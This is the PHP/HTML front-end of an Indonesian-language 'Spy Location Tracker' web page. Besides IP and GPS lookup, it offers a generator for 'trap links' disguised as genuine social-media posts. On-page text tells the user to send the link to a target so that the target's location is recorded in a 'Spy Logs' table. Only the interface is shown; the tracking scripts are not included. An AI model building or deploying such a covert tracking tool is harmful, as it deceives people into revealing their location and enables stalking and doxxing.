<?php
require_once '../src/LocationFinder.php';
require_once '../src/helpers.php';

use App\LocationFinder;

$apiKey = getEnvValue('API_KEY', '');
$finder = new LocationFinder($apiKey);

$clientIp = $finder->getClientIp();
$locationData = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ipToSearch = $_POST['ip_address'] ?? $clientIp;
    $locationData = $finder->findLocation($ipToSearch);
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Tracker - Advanced Location Intelligence</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-xl-9 col-lg-10">
                <div class="spy-card shadow-lg border-0 overflow-hidden">
                    <div class="card-header text-white text-center py-4">
                        <div class="mb-2"><i class="fas fa-user-secret fs-1"></i></div>
                        <h1 class="h3 mb-0">Spy Location Tracker</h1>
                        <p class="mb-0 opacity-75 small">Advanced IP & GPS Intelligence System</p>
                    </div>
                    
                    <div class="card-body p-4 p-md-5">
                        <!-- Navigation Tabs -->
                        <ul class="nav nav-pills nav-justified mb-5 bg-dark rounded-pill p-1" id="spyTabs" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active rounded-pill" id="track-tab" data-bs-toggle="pill" data-bs-target="#tab-track" type="button" role="tab"><i class="fas fa-search-location me-2"></i>Live Tracker</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link rounded-pill" id="generator-tab" data-bs-toggle="pill" data-bs-target="#tab-generator" type="button" role="tab"><i class="fas fa-link me-2"></i>Link Generator</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link rounded-pill" id="logs-tab" data-bs-toggle="pill" data-bs-target="#tab-logs" type="button" role="tab"><i class="fas fa-list-ul me-2"></i>Spy Logs</button>
                            </li>
                        </ul>

                        <div class="tab-content" id="spyTabsContent">
                            <!-- Tab 1: Live Tracker -->
                            <div class="tab-pane fade show active" id="tab-track" role="tabpanel">
                                <!-- IP Display Badge -->
                                <div class="text-center mb-5">
                                    <div class="data-label mb-2">IDENTIFIKASI IP PERANGKAT ANDA</div>
                                    <div class="ip-badge">
                                        <i class="fas fa-shield-alt me-2"></i><?php echo htmlspecialchars($clientIp); ?>
                                    </div>
                                </div>

                                <!-- Main Form -->
                                <div class="row justify-content-center mb-5">
                                    <div class="col-md-11">
                                        <form method="POST" action="" class="animate__animated animate__fadeInUp">
                                            <div class="input-group input-group-lg shadow-sm">
                                                <span class="input-group-text bg-transparent border-end-0 text-muted">
                                                    <i class="fas fa-globe"></i>
                                                </span>
                                                <input type="text" name="ip_address" class="form-control border-start-0 ps-0" 
                                                    placeholder="Masukkan Alamat IP Target..." required 
                                                    value="<?php echo isset($_POST['ip_address']) ? htmlspecialchars($_POST['ip_address']) : ''; ?>">
                                                <button class="btn btn-primary px-4 fw-bold" type="submit">
                                                    LACAK
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>

                                <!-- Action Buttons -->
                                <div class="row g-3 mb-5 justify-content-center">
                                    <div class="col-sm-5">
                                        <button id="btn-track-me" class="btn btn-action w-100 active-blue">
                                            <i class="fas fa-crosshairs me-2"></i>Lacak IP Saya
                                        </button>
                                    </div>
                                    <div class="col-sm-5">
                                        <button id="btn-geolocation" class="btn btn-action w-100 active-yellow">
                                            <i class="fas fa-map-marker-alt me-2"></i>Koordinat GPS
                                        </button>
                                    </div>
                                </div>
                            </div>

                            <!-- Tab 2: Link Generator -->
                            <div class="tab-pane fade" id="tab-generator" role="tabpanel">
                                <div class="text-center mb-4">
                                    <h4 class="fw-bold">Buat Link Jebakan</h4>
                                    <p class="text-muted small">Masukkan link postingan sosmed asli untuk menyamarkan link pelacak.</p>
                                </div>
                                <div class="row justify-content-center">
                                    <div class="col-md-11">
                                        <div class="input-group input-group-lg mb-3">
                                            <input type="url" id="target-url" class="form-control" placeholder="https://instagram.com/post/..." required>
                                            <button class="btn btn-success" id="btn-generate-link">
                                                <i class="fas fa-magic me-2"></i>GENERATE
                                            </button>
                                        </div>
                                        <div id="generated-result" class="d-none animate__animated animate__fadeIn">
                                            <div class="alert alert-success bg-success bg-opacity-10 border-success border-opacity-25">
                                                <div class="data-label text-success mb-2">LINK JEBAKAN ANDA:</div>
                                                <div class="input-group">
                                                    <input type="text" id="spy-url-result" class="form-control bg-dark border-0 text-white" readonly>
                                                    <button class="btn btn-outline-success" id="btn-copy-link"><i class="fas fa-copy"></i></button>
                                                </div>
                                                <div class="mt-2 small text-muted">Kirim link ini ke target. Saat diklik, lokasi mereka akan tercatat di tab Spy Logs.</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Tab 3: Spy Logs -->
                            <div class="tab-pane fade" id="tab-logs" role="tabpanel">
                                <div class="d-flex justify-content-between align-items-center mb-4">
                                    <h4 class="fw-bold mb-0">Log Aktivitas Pelacakan</h4>
                                    <button class="btn btn-sm btn-outline-info" id="btn-refresh-logs"><i class="fas fa-sync-alt me-2"></i>Refresh</button>
                                </div>
                                <div class="table-responsive">
                                    <table class="table table-dark table-hover align-middle small">
                                        <thead>
                                            <tr>
                                                <th>Waktu</th>
                                                <th>IP & ISP</th>
                                                <th>Lokasi</th>
                                                <th>Aksi</th>
                                            </tr>
                                        </thead>
                                        <tbody id="logs-body">
                                            <tr>
                                                <td colspan="4" class="text-center py-4 text-muted">Belum ada aktivitas pelacakan.</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <!-- Loading State -->
                        <div id="loading" class="text-center d-none my-5">
                            <div class="spinner-grow text-primary" style="width: 3rem; height: 3rem;" role="status"></div>
                            <p class="mt-3 fw-bold text-primary">MEMPROSES DATA...</p>
                        </div>

                        <!-- Results Area (Ditetapkan di luar tab karena bisa muncul dari berbagai aksi) -->
                        <div id="result-area" class="mt-4">
                            <?php if ($locationData): ?>
                                <?php echo formatLocationData($locationData); ?>
                            <?php endif; ?>
                        </div>

                        <!-- GPS Results Area -->
                        <div id="geo-result" class="mt-4 d-none animate__animated animate__fadeInUp">
                            <div class="result-card border-info border-opacity-25">
                                <h5 class="fw-bold text-info mb-4 d-flex align-items-center">
                                    <i class="fas fa-satellite-dish me-2"></i>Hasil Intelijen GPS
                                </h5>
                                <div id="geo-data"></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card-footer bg-transparent border-0 text-center py-4 opacity-50 small">
                        &copy; 2026 <span class="fw-bold">Bot Hunting Company Limited</span>. 
                        Sistem Pemantauan Geospasial Terenkripsi.
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="js/script.js"></script>
</body>
</html>
